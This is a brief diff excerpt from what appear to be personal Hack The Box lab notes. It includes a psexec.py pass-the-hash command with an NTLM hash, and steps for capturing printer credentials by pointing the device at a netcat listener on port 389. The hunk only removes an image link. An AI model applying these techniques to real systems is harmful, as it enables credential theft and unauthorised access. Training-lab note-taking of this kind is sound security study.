@@ -94,6 +94,5 @@ psexec.py Administrator@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:36242e2
 #### HTB Printer Admin Page
 sudo rlwrap -cAr nc -lvnp 389
 Navigate to settings page:
-![[Pasted image 20220218175015.png]]
 Enter your Kali IP in the Server Address field.
 Click update, get creds in listener.
